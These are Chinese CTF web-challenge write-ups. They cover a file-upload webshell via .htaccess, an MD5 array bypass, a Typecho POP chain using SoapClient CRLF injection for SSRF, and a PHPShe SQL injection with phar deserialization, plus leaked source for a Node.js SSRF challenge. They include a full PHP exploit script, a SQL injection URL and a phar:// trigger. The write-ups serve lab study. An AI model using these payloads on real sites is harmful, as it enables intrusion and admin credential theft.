## `[MRCTF2020]`你传你🐎呢 #文件上传
文件上传发现被过滤

![](attachments/Pasted%20image%2020230415111247.png)

修改content-type 为image/jpeg和后缀名后上传成功

![](attachments/Pasted%20image%2020230415111607.png)

/var/www/html/upload/ebe5b85736548ba0a494c533dec573bc/shell.jpg

这里写.htaccess文件更改解析

```
AddType application/x-httpd-php .jpg
```

执行命令的时候发现没反应，phpinfo后发现是ban了system

![](attachments/Pasted%20image%2020230415112615.png)

直接蚁剑，蚁剑坏了，利用无参rce的技巧来读

print_r(scandir("."))

![](attachments/Pasted%20image%2020230415113607.png)


![](attachments/Pasted%20image%2020230415113703.png)

## `[MRCTF2020]`Ez_bypass

访问主页面
```php
I put something in F12 for you include 'flag.php'; 
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; 
if(isset($_GET['gg'])&&isset($_GET['id'])) { 
	$id=$_GET['id']; $gg=$_GET['gg']; 
	if (md5($id) === md5($gg) && $id !== $gg) { 
		echo 'You got the first step'; 
		if(isset($_POST['passwd'])) { 
			$passwd=$_POST['passwd']; 
				if (!is_numeric($passwd)) { 
					if($passwd==1234567) { 
						echo 'Good Job!'; 
						highlight_file('flag.php'); 
						die('By Retr_0'); } 
					else { 
						echo "can you think twice??"; 
						} 
					} 
				else{ 
					echo 'You can not get it !'; 
					} 
				}
			else{ 
				die('only one way to get the flag'); 
				} 
			} 
		else { 
			echo "You are not a real hacker!"; 
			} 
		} 
	else{ 
		die('Please input first'); 
		} 
	}
Please input first
```

其实就是md5的无法处理数组和比较类型问题

![](attachments/Pasted%20image%2020230415114824.png)

## `[MRCTF2020]`Ezpop-Revenge #Soap  #SSRF #反序列化
`www.zip`源码泄露

flag.php
```php
<?php  
if(!isset($_SESSION)) session_start();  
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){  
   $_SESSION['flag']= "MRCTF{******}";  
}else echo "我扌your problem?\nonly localhost can get flag!";  
?>
```

猜测是反序列化结合ssrf，可能存在的反序列化点：
- phar文件上传
- 用户输入反序列化

在全局找serialize函数发现在HelloWorld下的Plugin.php有特别的反序列化点

![](attachments/Pasted%20image%2020230420114048.png)

```php
<?php  
if (!defined('__TYPECHO_ROOT_DIR__')) exit;  
/**  
 * Hello World ** @package HelloWorld   
* @author qining  
 * @version 1.0.0  
 * @link http://typecho.org  
 */class HelloWorld_DB{  
    private $flag="MRCTF{this_is_a_fake_flag}";  
    private $coincidence;  
    function  __wakeup(){  
        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);  
    }  
}  
class HelloWorld_Plugin implements Typecho_Plugin_Interface  
{  
    /**  
     * 激活插件方法,如果激活失败,直接抛出异常  
     *   
* @access public  
     * @return void  
     * @throws Typecho_Plugin_Exception  
     */    
     public static function activate()  
    {        
    Typecho_Plugin::factory('admin/menu.php')->navBar = array('HelloWorld_Plugin', 'render');  
    }  
    /**  
     * 禁用插件方法,如果禁用失败,直接抛出异常  
     *   
* @static  
     * @access public  
     * @return void  
     * @throws Typecho_Plugin_Exception  
     */    
     public static function deactivate(){}  
    /**  
     * 获取插件配置面板  
     *   
* @access public  
     * @param Typecho_Widget_Helper_Form $form 配置面板  
     * @return void  
     */   
     public static function config(Typecho_Widget_Helper_Form $form)  
    {        /** 分类名称 */  
        $name = new Typecho_Widget_Helper_Form_Element_Text('word', NULL, 'Hello World', _t('说点什么'));  
        $form->addInput($name);  
    }  
    /**  
     * 个人用户的配置面板  
     *   
* @access public  
     * @param Typecho_Widget_Helper_Form $form  
     * @return void  
     */    
     public static function personalConfig(Typecho_Widget_Helper_Form $form){}  
    /**  
     * 插件实现方法  
     *   
* @access public  
     * @return void  
     */    
     public static function render()  
    {        echo '<span class="message success">'  
            . htmlspecialchars(Typecho_Widget::widget('Widget_Options')->plugin('HelloWorld')->word)  
            . '</span>';  
    }
    public function action(){  
        if(!isset($_SESSION)) session_start();  
        if(isset($_REQUEST['admin'])) var_dump($_SESSION);  
        if (isset($_POST['C0incid3nc3'])) {  
         if(preg_match("/file|assert|eval|[`\'~^?<>$%]+/i",base64_decode($_POST['C0incid3nc3'])) === 0)  
            unserialize(base64_decode($_POST['C0incid3nc3']));  
         else {  
            echo "Not that easy.";  
         }  
        }    }}
```

在Plugin.php的__wakeup方法中，new了一个新的类，跟进到var/Typecho/Db.php，在它的__construct函数中出现了字符串拼接

![](attachments/Pasted%20image%2020230420115245.png)

找了__toString()魔术方法

![](attachments/Pasted%20image%2020230420120015.png)

```php
  
public function __toString()  
{  
    switch ($this->_sqlPreBuild['action']) {  
        case Typecho_Db::SELECT:  
            return $this->_adapter->parseSelect($this->_sqlPreBuild);  
        case Typecho_Db::INSERT:  
            return 'INSERT INTO '  
            . $this->_sqlPreBuild['table']  
            . '(' . implode(' , ', array_keys($this->_sqlPreBuild['rows'])) . ')'  
            . ' VALUES '  
            . '(' . implode(' , ', array_values($this->_sqlPreBuild['rows'])) . ')'  
            . $this->_sqlPreBuild['limit'];  
        case Typecho_Db::DELETE:  
            return 'DELETE FROM '  
            . $this->_sqlPreBuild['table']  
            . $this->_sqlPreBuild['where'];  
        case Typecho_Db::UPDATE:  
            $columns = array();  
            if (isset($this->_sqlPreBuild['rows'])) {  
                foreach ($this->_sqlPreBuild['rows'] as $key => $val) {  
                    $columns[] = "$key = $val";  
                }  
            }  
            return 'UPDATE '  
            . $this->_sqlPreBuild['table']  
            . ' SET ' . implode(' , ', $columns)  
            . $this->_sqlPreBuild['where'];  
        default:  
            return NULL;  
    }  
}
```

这里的第一个case的return形式很容易想到调用__call(),结合前面的ssrf这里将_adapter设置成soapclient，利用它的__call方法来设置报文头

[PHP SOAP使用 - KvienChen - 博客园 (cnblogs.com)](https://www.cnblogs.com/kvienchen/p/8310798.html)

这里的pop链流程
`HelloWorld_DB::__wakeup`->`Typecho_Db::__contrust(__toString)`->`Typecho_Db_Query::__contrust(this->_adapter=new Soapclient)`

```php
<?php
class Typecho_Db_Query
{
    private $_sqlPreBuild;
    private $_adapter;

    /**
     * @throws SoapFault
     */
    public function __construct()
    {
        $host = "http://127.0.0.1/flag.php";
        $header = array('X-Forwarded-For: 127.0.0.1','Cookie: PHPSESSID=09iejf3jroh277kirj14795qi3');
        $this->_sqlPreBuild['action'] = 'SELECT';
        $this->_adapter = new SoapClient(null, array('location'=>$host, 'user_agent'=>'wuwumonster^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$header),'uri'=> "wuwumonster"));
    }
}

class Typecho_Db
{
    public function __construct($adapterName, $prefix = 'typecho_')
    {
        $adapterName = 'Typecho_Db_Adapter_' . $adapterName;
    }
}
class HelloWorld_DB
{
    private $coincidence;
    function __construct()
    {
        $this->coincidence = (['hello' => new Typecho_Db_Query(), 'world' => 'typecho_']);
    }
    function  __wakeup(){
        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);
    }
}

$ser = serialize(new HelloWorld_DB());
print($ser);
$ser_b64 = base64_encode($ser);
print('
');
print($ser_b64);

```

反序列化点的路由

![](attachments/Pasted%20image%2020230420132110.png)

发现被过滤
```php
public function action(){  
     if(!isset($_SESSION)) session_start();  
     if(isset($_REQUEST['admin'])) var_dump($_SESSION);  
     if (isset($_POST['C0incid3nc3'])) {  
if(preg_match("/file|assert|eval|[`\'~^?<>$%]+/i",base64_decode($_POST['C0incid3nc3'])) === 0)  
   unserialize(base64_decode($_POST['C0incid3nc3']));  
else {  
   echo "Not that easy.";  
}  
     } 
}
```

发现是`^^`被匹配到了这里将他换为`\r\n`

在用payload传参后只需要带着一样的phpsessid去访问就可以了
![](attachments/Pasted%20image%2020230420141459.png)

最终exp

```php
<?php  
class Typecho_Db_Query  
{  
    private $_sqlPreBuild;  
    private $_adapter;  
  
    public function __construct()  
    {        $host = "http://127.0.0.1/flag.php";  
        $header = array('Cookie: PHPSESSID=4mrff5ndm9o9irau6bq0na38n6',);  
        $this->_sqlPreBuild['action'] = 'SELECT';  
        $this->_adapter = new SoapClient(null, array('location'=>$host, 'user_agent'=>str_replace('^^', "\r\n",'wuwumonster^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$header)),'uri'=> "wuwumonster"));  
    }  
}  
  
class Typecho_Db  
{  
    public function __construct($adapterName, $prefix = 'typecho_')  
    {        $adapterName = 'Typecho_Db_Adapter_' . $adapterName;  
    }  
}  
class HelloWorld_DB  
{  
    private $coincidence;  
    function __construct()  
    {        $this->coincidence = (['hello' => new Typecho_Db_Query(), 'world' => 'typecho_']);  
    }  
    function  __wakeup(){  
        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);  
    }  
}  
  
$ser = serialize(new HelloWorld_DB());  
  
print($ser);  
$ser_b64 = base64_encode($ser);  
print('  
');  
if(preg_match("/file|assert|eval|[`\'~^?<>$%]+/i",base64_decode($ser_b64)) === 0){  
    print($ser_b64);  
}  
else{  
    print("matched");  
}
```

## `[RoarCTF 2019]`PHPShe

是phpshe的cms
对应插件存在sql注入漏洞
[代码审计之phpshev1.7前台注入和zzzphpv1.74后台sql注入 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/254237.html)

payload：
```
/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_
```

注出来的value是md5值需要解密

![](attachments/Pasted%20image%2020230415121448.png)

![](attachments/Pasted%20image%2020230415121345.png)

admin/atlman777   登录后台

搜索后并没有phpshe的后台漏洞，再在后台最可能的是文件上传来rce，按理来说应该是出题人对源码做了修改，自己憋了个洞出来，但是官方源码没有以前的版本，只有最新的。。。，这样就只能自己审计了

![](attachments/Pasted%20image%2020230415122154.png)

seay扫了一下

![](attachments/Pasted%20image%2020230415123155.png)

pclzip.class.php的问题是最多的，就从这里开始慢慢审计

粗略看的时候发现有个__destruct

![](attachments/Pasted%20image%2020230415124136.png)

这里构造反序列化的话save_path是可控的，从功能上讲可以通过控制save_path来控制解压位置，现在的想法是上传压缩的webshell然后通过控制解压路径解压到能够访问的路径
现在需要找一个能够触发反序列化的点

在找unserliaze的时候发现大多都写死了序列化内容，没有写死的不是很复杂就是变量不可控，现在来考虑能够触发phar的函数，pclzip.class.php中的无法利用，而其他文件中的大多复杂且参数不可控，这里的glob.func.php中的是可控的，删除文件夹的函数

![](attachments/Pasted%20image%2020230415132901.png)

这个函数在moban.php中有调用且参数可控

![](attachments/Pasted%20image%2020230415133140.png)

这里pe_token_match的判断token，这个token是在登录的时候就有对应函数设置好的，是用来校验admin的

![](attachments/Pasted%20image%2020230415133657.png)

上传shell压缩包，路径为/data/attachment/brand/2.zip

![](attachments/Pasted%20image%2020230415132134.png)

提交phar的时候记录pe_token    c9ef985805818f52722ca596862b8928

![](attachments/Pasted%20image%2020230415134742.png)

然后构造一个删除的payload
admin.php?mod=moban&act=del&token=c9ef985805818f52722ca596862b8928&tpl=phar:///var/www/html/data/attachment/brand/7.txt

![](attachments/Pasted%20image%2020230415140103.png)

就触发了phar包将压缩的webshell解压到了对应文件夹

![](attachments/Pasted%20image%2020230415140212.png)


## `[虎符CTF 2021]`Internal System

F12,提示有source

![](attachments/Pasted%20image%2020230416114326.png)

```python
const express = require('express')
const router = express.Router()

const axios = require('axios')

const isIp = require('is-ip')
const IP = require('ip')

const UrlParse = require('url-parse')

const {sha256, hint} = require('./utils')

const salt = 'nooooooooodejssssssssss8_issssss_beeeeest'

const adminHash = sha256(sha256(salt + 'admin') + sha256(salt + 'admin'))

const port = process.env.PORT || 3000

function formatResopnse(response) {
  if(typeof(response) !== typeof('')) {
    return JSON.stringify(response)
  } else {
    return response
  }
}

function SSRF_WAF(url) {
  const host = new UrlParse(url).hostname.replace(/\[|\]/g, '')

  return isIp(host) && IP.isPublic(host)
}

function FLAG_WAF(url) {
  const pathname = new UrlParse(url).pathname
  return !pathname.startsWith('/flag')
}

function OTHER_WAF(url) {
  return true;
}

const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]

router.get('/', (req, res, next) => {
  if(req.session.admin === undefined || req.session.admin === null) {
    res.redirect('/login')
  } else {
    res.redirect('/index')
  }
})

router.get('/login', (req, res, next) => {
  const {username, password} = req.query;

  if(!username || !password || username === password || username.length === password.length || username === 'admin') {
    res.render('login')
  } else {
    const hash = sha256(sha256(salt + username) + sha256(salt + password))

    req.session.admin = hash === adminHash

    res.redirect('/index')
  }
})

router.get('/index', (req, res, next) => {
  if(req.session.admin === undefined || req.session.admin === null) {
    res.redirect('/login')
  } else {
    res.render('index', {admin: req.session.admin, network: JSON.stringify(require('os').networkInterfaces())})
  }
})

router.get('/proxy', async(req, res, next) => {
  if(!req.session.admin) {
    return res.redirect('/index')
  }
  const url = decodeURI(req.query.url);

  console.log(url)

  const status = WAF_LISTS.map((waf)=>waf(url)).reduce((a,b)=>a&&b)

  if(!status) {
    res.render('base', {title: 'WAF', content: "Here is the waf..."})
  } else {
    try {
      const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`)
      res.render('base', response.data)
    } catch(error) {
      res.render('base', error.message)
    }
  }
})

router.post('/proxy', async(req, res, next) => {
  if(!req.session.admin) {
    return res.redirect('/index')
  }
  // test url
  // not implemented here
  const url = "https://postman-echo.com/post"
  await axios.post(`http://127.0.0.1:${port}/search?url=${url}`)
  res.render('base', "Something needs to be implemented")
})


router.all('/search', async (req, res, next) => {
  if(!/127\.0\.0\.1/.test(req.ip)){
    return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'})
  }

  const result = {title: 'Search Success', content: ''}

  const method = req.method.toLowerCase()
  const url = decodeURI(req.query.url)
  const data = req.body

  try {
    if(method == 'get') {
      const response = await axios.get(url)
      result.content = formatResopnse(response.data)
    } else if(method == 'post') {
      const response = await axios.post(url, data)
      result.content = formatResopnse(response.data)
    } else {
      result.title = 'Error'
      result.content = 'Unsupported Method'
    }
  } catch(error) {
    result.title = 'Error'
    result.content = error.message
  }

  return res.json(result)
})

router.get('/source', (req, res, next)=>{
  res.sendFile( __dirname + "/" + "index.js");
})

router.get('/flag', (req, res, next) => {
  if(!/127\.0\.0\.1/.test(req.ip)){
    return res.send({title: 'Error', content: 'No Flag For You!'})
  }
  return res.json({hint: hint})
})

module.exports = router
```